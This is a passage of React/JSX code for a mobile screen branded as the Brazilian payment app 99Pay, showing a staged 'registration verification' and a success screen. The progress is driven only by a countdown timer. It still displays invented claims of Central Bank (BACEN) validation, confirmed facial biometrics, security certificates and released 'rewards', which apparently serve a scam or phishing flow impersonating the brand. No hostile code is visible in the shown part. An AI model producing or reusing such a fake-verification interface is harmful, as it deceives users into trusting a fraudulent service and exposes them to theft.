              <rect x="30" y="20" width="40" height="60" rx="4" stroke="currentColor" strokeWidth="3" fill="none"/>
              <rect x="35" y="35" width="30" height="20" rx="2" stroke="currentColor" strokeWidth="2" fill="none"/>
              {/* Linhas do documento */}
              <line x1="38" y1="42" x2="55" y2="42" stroke="currentColor" strokeWidth="2"/>
              <line x1="38" y1="48" x2="50" y2="48" stroke="currentColor" strokeWidth="2"/>
              {/* Icone de pessoa */}
              <circle cx="60" cy="40" r="4" fill="currentColor"/>
              <path d="M55 52 Q60 48 65 52" stroke="currentColor" strokeWidth="2" fill="none"/>
              {/* Cadeado */}
              <rect x="20" y="25" width="12" height="10" rx="2" fill="currentColor"/>
              <path d="M23 25 V22 Q26 18 29 22 V25" stroke="currentColor" strokeWidth="2" fill="none"/>
              {/* Check */}
              <circle cx="72" cy="35" r="8" fill="currentColor"/>
              <path d="M68 35 L71 38 L76 32" stroke="white" strokeWidth="2" fill="none"/>
              {/* Conexao pontilhada */}
              <circle cx="26" cy="45" r="2" fill="currentColor"/>
              <circle cx="26" cy="55" r="2" fill="currentColor"/>
            </svg>
          </div>
          
          <h1 className="text-3xl font-bold text-gray-900 mb-3">Tudo certo!</h1>
          <p className="text-gray-500 text-lg text-center mb-16">Você concluiu todas as etapas com sucesso!</p>
          
          {/* Botao Fechar */}
          <button
            onClick={handleTudoCertoFechar}
            className="w-full max-w-sm py-4 rounded-xl text-lg font-bold bg-[#FFE500] text-gray-900 active:scale-95 transition-all shadow-lg"
          >
            Fechar
          </button>
        </div>
      )}

      {/* ETAPA 8 - Verificando cadastro (padrao bancario 99Pay) */}
      {currentStep === 8 && (() => {
        // Timer comeca em 30. Calcula progresso de 0 a 100
        const progress = Math.max(0, Math.min(100, ((30 - verificationTimer) / 30) * 100))
        return (
        <div className="fixed inset-0 bg-white z-[100] flex flex-col animate-in fade-in duration-400 overflow-hidden">
          {/* Faixa decorativa superior */}
          <div className="absolute top-0 inset-x-0 h-[220px] bg-gradient-to-b from-[#FFF9D6] via-[#FFFCEC] to-white pointer-events-none" />
          <div className="absolute top-0 left-0 w-64 h-64 bg-[#FFE500]/15 rounded-full blur-3xl pointer-events-none" />
          <div className="absolute top-10 right-0 w-48 h-48 bg-[#FFB800]/10 rounded-full blur-3xl pointer-events-none" />

          {/* Header do app */}
          <div className="relative z-10 pt-5 px-4 pb-2 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 bg-[#FFE500] rounded-lg flex items-center justify-center shadow-sm">
                <span className="text-gray-900 font-black text-sm">99</span>
              </div>
              <div>
                <p className="text-[10px] text-gray-500 font-medium leading-none">99Pay</p>
                <p className="text-xs font-bold text-gray-900 leading-tight">Verificação de cadastro</p>
              </div>
            </div>
            <div className="flex items-center gap-1.5 bg-green-50 border border-green-200 rounded-full px-2.5 py-1">
              <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse" />
              <span className="text-[10px] font-bold text-green-700 tracking-wide">SEGURO</span>
            </div>
          </div>

          {/* Conteudo principal */}
          <div className="relative z-10 flex-1 overflow-y-auto px-4 py-4">
            {/* Loader circular com tempo restante */}
            <div className="flex flex-col items-center mb-6">
              <div className="relative w-44 h-44 flex items-center justify-center">
                {/* Anel de fundo */}
                <svg className="absolute inset-0 w-full h-full -rotate-90" viewBox="0 0 176 176">
                  <circle
                    cx="88" cy="88" r="78"
                    fill="none" stroke="#F3F4F6" strokeWidth="6"
                  />
                  {/* Progresso real */}
                  <circle
                    cx="88" cy="88" r="78"
                    fill="none" stroke="url(#verifyGradient)" strokeWidth="6"
                    strokeLinecap="round"
                    strokeDasharray={`${progress * 4.9} 490`}
                    className="transition-all duration-1000 drop-shadow-[0_0_8px_rgba(255,229,0,0.5)]"
                  />
                  <defs>
                    <linearGradient id="verifyGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                      <stop offset="0%" stopColor="#FFE500" />
                      <stop offset="100%" stopColor="#FFB800" />
                    </linearGradient>
                  </defs>
                </svg>

                {/* Ponto pulsante no inicio do progresso */}
                <div
                  className="absolute inset-0"
                  style={{ transform: `rotate(${progress * 3.6}deg)`, transition: "transform 1s linear" }}
                >
                  <div className="absolute top-0 left-1/2 -translate-x-1/2 w-2.5 h-2.5 bg-[#FFE500] rounded-full shadow-md shadow-yellow-400 animate-pulse" />
                </div>

                {/* Centro - Icone escudo com spinners duplos */}
                <div className="relative w-24 h-24 bg-white rounded-full shadow-[0_10px_40px_-8px_rgba(255,213,0,0.5)] flex items-center justify-center border border-gray-100">
                  <svg
                    className="absolute inset-0 w-full h-full -rotate-90"
                    viewBox="0 0 96 96"
                    style={{ animation: "conic-rotate 1.2s linear infinite" }}
                  >
                    <circle
                      cx="48" cy="48" r="44"
                      fill="none" stroke="#FFE500" strokeWidth="3"
                      strokeLinecap="round" strokeDasharray="60 220"
                    />
                  </svg>
                  <svg
                    className="absolute inset-0 w-full h-full rotate-90"
                    viewBox="0 0 96 96"
                    style={{ animation: "conic-rotate-reverse 1.8s linear infinite" }}
                  >
                    <circle
                      cx="48" cy="48" r="40"
                      fill="none" stroke="#FFB800" strokeWidth="2"
                      strokeLinecap="round" strokeDasharray="30 220" opacity="0.6"
                    />
                  </svg>
                  <svg
                    className="w-12 h-12 text-gray-900 relative z-10"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                    strokeWidth={2}
                    style={{ animation: "document-float 3s ease-in-out infinite" }}
                  >
                    <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                  </svg>
                </div>
              </div>

              {/* Titulo dinamico */}
              <h2 className="text-xl font-bold text-gray-900 tracking-tight mt-5 mb-1 text-center">
                {progress < 20 && "Iniciando verificação..."}
                {progress >= 20 && progress < 45 && "Analisando dados"}
                {progress >= 45 && progress < 70 && "Validando no BACEN"}
                {progress >= 70 && progress < 95 && "Quase lá!"}
                {progress >= 95 && "Finalizando..."}
              </h2>
              <p className="text-xs text-gray-500 text-center max-w-[260px] leading-relaxed">
                {progress < 20 && "Estabelecendo conexão segura com o Banco Central"}
                {progress >= 20 && progress < 45 && "Conferindo seus dados pessoais e documentos"}
                {progress >= 45 && progress < 70 && "Validando identidade junto ao Banco Central do Brasil"}
                {progress >= 70 && progress < 95 && "Liberando sua conta e recompensas"}
                {progress >= 95 && "Concluindo verificação de segurança"}
              </p>

              {/* Tempo restante */}
              <div className="flex items-center gap-1.5 mt-3 bg-[#FFE500]/20 border border-[#FFE500]/40 px-3 py-1 rounded-full">
                <svg className="w-3 h-3 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2.5}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <span className="text-[11px] font-bold text-gray-800">
                  {verificationTimer}s restantes
                </span>
              </div>
            </div>

            {/* Stepper com progresso real */}
            <div
              className="bg-white rounded-2xl border border-gray-200 shadow-[0_4px_20px_-4px_rgba(0,0,0,0.06)] p-4 mb-4"
              style={{ animation: "slide-in-step 0.5s ease-out forwards", opacity: 0, animationDelay: "0.2s" }}
            >
              <div className="flex items-center justify-between mb-3">
                <p className="text-xs font-bold text-gray-900 uppercase tracking-wide">Etapas da verificação</p>
                <span className="text-xs font-bold text-[#FFB800]">{Math.round(progress)}%</span>
              </div>

              <div className="space-y-0">
                {/* Etapa 1 - Conexao segura */}
                <div className="flex items-start gap-3 pb-3 relative">
                  <div className="flex flex-col items-center flex-shrink-0">
                    {progress >= 20 ? (
                      <div className="w-7 h-7 bg-green-500 rounded-full flex items-center justify-center shadow-sm shadow-green-300">
                        <svg className="w-3.5 h-3.5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3.5}>
                          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                        </svg>
                      </div>
                    ) : (
                      <div className="relative w-7 h-7 bg-[#FFE500] rounded-full flex items-center justify-center shadow-md shadow-yellow-300">
                        <svg className="w-3.5 h-3.5 text-gray-900 animate-spin" viewBox="0 0 24 24" fill="none" style={{ animationDuration: "1s" }}>
                          <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="3" strokeDasharray="28 60" strokeLinecap="round" />
                        </svg>
                      </div>
                    )}
                    <div className={`w-0.5 flex-1 mt-0.5 ${progress >= 20 ? "bg-green-500" : "bg-gray-200"}`} style={{ minHeight: "16px" }} />
                  </div>
                  <div className="flex-1 pt-0.5 pb-3">
                    <p className="text-sm font-bold text-gray-900 leading-tight">Conexão segura</p>
                    <p className="text-[11px] text-gray-500 mt-0.5">Canal criptografado estabelecido</p>
                  </div>
                  <span className={`text-[10px] font-bold pt-1 ${progress >= 20 ? "text-green-600" : "text-[#FFB800]"}`}>
                    {progress >= 20 ? "100%" : "..."}
                  </span>
                </div>

                {/* Etapa 2 - Dados pessoais */}
                <div className="flex items-start gap-3 pb-3 relative">
                  <div className="flex flex-col items-center flex-shrink-0">
                    {progress >= 45 ? (
                      <div className="w-7 h-7 bg-green-500 rounded-full flex items-center justify-center shadow-sm shadow-green-300">
                        <svg className="w-3.5 h-3.5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3.5}>
                          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                        </svg>
                      </div>
                    ) : progress >= 20 ? (
                      <div className="relative w-7 h-7 bg-[#FFE500] rounded-full flex items-center justify-center shadow-md shadow-yellow-300">
                        <svg className="w-3.5 h-3.5 text-gray-900 animate-spin" viewBox="0 0 24 24" fill="none" style={{ animationDuration: "1s" }}>
                          <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="3" strokeDasharray="28 60" strokeLinecap="round" />
                        </svg>
                      </div>
                    ) : (
                      <div className="w-7 h-7 bg-gray-100 border-2 border-gray-200 rounded-full flex items-center justify-center">
                        <div className="w-1.5 h-1.5 bg-gray-300 rounded-full" />
                      </div>
                    )}
                    <div className={`w-0.5 flex-1 mt-0.5 ${progress >= 45 ? "bg-green-500" : "bg-gray-200"}`} style={{ minHeight: "16px" }} />
                  </div>
                  <div className="flex-1 pt-0.5 pb-3">
                    <p className={`text-sm font-bold leading-tight ${progress >= 20 ? "text-gray-900" : "text-gray-500"}`}>Dados pessoais</p>
                    <p className="text-[11px] text-gray-500 mt-0.5">Nome, CPF e documentos verificados</p>
                  </div>
                  <span className={`text-[10px] font-bold pt-1 ${progress >= 45 ? "text-green-600" : progress >= 20 ? "text-[#FFB800]" : "text-gray-400"}`}>
                    {progress >= 45 ? "100%" : progress >= 20 ? "..." : "Aguardando"}
                  </span>
                </div>

                {/* Etapa 3 - Reconhecimento facial */}
                <div className="flex items-start gap-3 pb-3 relative">
                  <div className="flex flex-col items-center flex-shrink-0">
                    {progress >= 70 ? (
                      <div className="w-7 h-7 bg-green-500 rounded-full flex items-center justify-center shadow-sm shadow-green-300">
                        <svg className="w-3.5 h-3.5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3.5}>
                          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                        </svg>
                      </div>
                    ) : progress >= 45 ? (
                      <div className="relative w-7 h-7 bg-[#FFE500] rounded-full flex items-center justify-center shadow-md shadow-yellow-300">
                        <svg className="w-3.5 h-3.5 text-gray-900 animate-spin" viewBox="0 0 24 24" fill="none" style={{ animationDuration: "1s" }}>
                          <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="3" strokeDasharray="28 60" strokeLinecap="round" />
                        </svg>
                      </div>
                    ) : (
                      <div className="w-7 h-7 bg-gray-100 border-2 border-gray-200 rounded-full flex items-center justify-center">
                        <div className="w-1.5 h-1.5 bg-gray-300 rounded-full" />
                      </div>
                    )}
                    <div className={`w-0.5 flex-1 mt-0.5 ${progress >= 70 ? "bg-green-500" : "bg-gray-200"}`} style={{ minHeight: "16px" }} />
                  </div>
                  <div className="flex-1 pt-0.5 pb-3">
                    <p className={`text-sm font-bold leading-tight ${progress >= 45 ? "text-gray-900" : "text-gray-500"}`}>Reconhecimento facial</p>
                    <p className="text-[11px] text-gray-500 mt-0.5">Identidade biométrica confirmada</p>
                  </div>
                  <span className={`text-[10px] font-bold pt-1 ${progress >= 70 ? "text-green-600" : progress >= 45 ? "text-[#FFB800]" : "text-gray-400"}`}>
                    {progress >= 70 ? "100%" : progress >= 45 ? "..." : "Aguardando"}
                  </span>
                </div>

                {/* Etapa 4 - Validacao BACEN */}
                <div className="flex items-start gap-3">
                  <div className="flex flex-col items-center flex-shrink-0">
                    {progress >= 95 ? (
                      <div className="w-7 h-7 bg-green-500 rounded-full flex items-center justify-center shadow-sm shadow-green-300">
                        <svg className="w-3.5 h-3.5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3.5}>
                          <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                        </svg>
                      </div>
                    ) : progress >= 70 ? (
                      <div className="relative w-7 h-7 bg-[#FFE500] rounded-full flex items-center justify-center shadow-md shadow-yellow-300">
                        <svg className="w-3.5 h-3.5 text-gray-900 animate-spin" viewBox="0 0 24 24" fill="none" style={{ animationDuration: "1s" }}>
                          <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="3" strokeDasharray="28 60" strokeLinecap="round" />
                        </svg>
                      </div>
                    ) : (
                      <div className="w-7 h-7 bg-gray-100 border-2 border-gray-200 rounded-full flex items-center justify-center">
                        <div className="w-1.5 h-1.5 bg-gray-300 rounded-full" />
                      </div>
                    )}
                  </div>
                  <div className="flex-1 pt-0.5">
                    <p className={`text-sm font-bold leading-tight ${progress >= 70 ? "text-gray-900" : "text-gray-500"}`}>Validação no BACEN</p>
                    <p className="text-[11px] text-gray-500 mt-0.5">Conta aprovada pelo Banco Central</p>
                  </div>
                  <span className={`text-[10px] font-bold pt-1 ${progress >= 95 ? "text-green-600" : progress >= 70 ? "text-[#FFB800]" : "text-gray-400"}`}>
                    {progress >= 95 ? "100%" : progress >= 70 ? "..." : "Aguardando"}
                  </span>
                </div>
              </div>
            </div>

            {/* Selos de seguranca */}
            <div
              className="grid grid-cols-3 gap-2"
              style={{ animation: "slide-in-step 0.5s ease-out forwards", opacity: 0, animationDelay: "0.4s" }}
            >
              <div className="bg-white rounded-xl border border-gray-200 p-2.5 flex flex-col items-center justify-center text-center">
                <svg className="w-5 h-5 text-green-600 mb-1" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 15l-4-4 1.41-1.41L11 13.17l6.59-6.59L19 8l-8 8z" />
                </svg>
                <p className="text-[9px] font-bold text-gray-700 leading-tight">Certificado</p>
                <p className="text-[8px] text-gray-500 leading-tight">BACEN</p>
              </div>
              <div className="bg-white rounded-xl border border-gray-200 p-2.5 flex flex-col items-center justify-center text-center">
                <svg className="w-5 h-5 text-gray-700 mb-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
                <p className="text-[9px] font-bold text-gray-700 leading-tight">Criptografia</p>
                <p className="text-[8px] text-gray-500 leading-tight">256-bit SSL</p>
              </div>
              <div className="bg-white rounded-xl border border-gray-200 p-2.5 flex flex-col items-center justify-center text-center">
                <svg className="w-5 h-5 text-[#FFB800] mb-1" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" />
                </svg>
                <p className="text-[9px] font-bold text-gray-700 leading-tight">LGPD</p>
                <p className="text-[8px] text-gray-500 leading-tight">Dados protegidos</p>
              </div>
            </div>
          </div>

          {/* Footer fixo com barra de progresso */}
          <div className="relative z-10 border-t border-gray-100 bg-white px-4 pt-3 pb-4">
            <div className="h-1 bg-gray-100 rounded-full overflow-hidden relative mb-2">
              <div
                className="absolute inset-y-0 left-0 bg-gradient-to-r from-[#FFE500] to-[#FFB800] rounded-full transition-all duration-1000"
                style={{ width: `${progress}%` }}
              />
            </div>
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-1.5">
                <svg className="w-3 h-3 text-green-600" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
                </svg>
                <span className="text-[10px] text-gray-600 font-medium">Verificação criptografada</span>
              </div>
              <span className="text-[10px] text-gray-500 font-mono tracking-wide">{Math.round(progress)}%</span>
            </div>
          </div>
        </div>
        )
      })()}

      {/* ETAPA 9 - Animacao de sucesso */}
      {currentStep === 9 && (
        <SuccessScreen onStart={handleStep9Start} />
      )}
    </div>
  )
}
